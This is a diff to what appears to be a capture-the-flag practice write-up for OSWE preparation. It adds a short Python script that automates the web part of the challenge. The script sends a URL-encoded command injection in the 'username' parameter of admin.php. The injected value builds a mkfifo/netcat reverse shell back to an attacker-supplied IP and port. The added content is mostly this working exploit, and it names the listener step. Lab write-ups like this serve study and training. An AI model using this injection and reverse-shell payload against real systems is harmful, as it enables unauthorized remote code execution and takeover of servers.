@@ -154,4 +154,18 @@ A few minutes later
 ![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/965711a5-e175-4531-8208-760a556cf98d)
 
 
-Really fun CTF! But I'm not sure how this relates to the OSWE
+Really fun CTF! But I'm not sure how this relates to the OSWE.
+Anyway a few weeks later, here's the scripting automating the web part, which is pretty simple. I also re-did the PE part with ghidra, that was definitely a better and easier approach.
+
+````
+import requests
+import sys
+
+print("Open a listener on port "+ sys.argv[3]+ "!")
+
+url = sys.argv[1] #http://10.0.2.8
+ip = sys.argv[2] #10.0.2.4
+port = sys.argv[3] #1337
+
+requests.get(url + '/admin.php?username=a\'%23\'%20%7crm%20%2ftmp%2ff%3bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff%7c%2fbin%2fsh%20-i%202%3e%261%7cnc%20' + ip + '%20' + port + '%20%3e%2ftmp%2ff&password=x')
+````
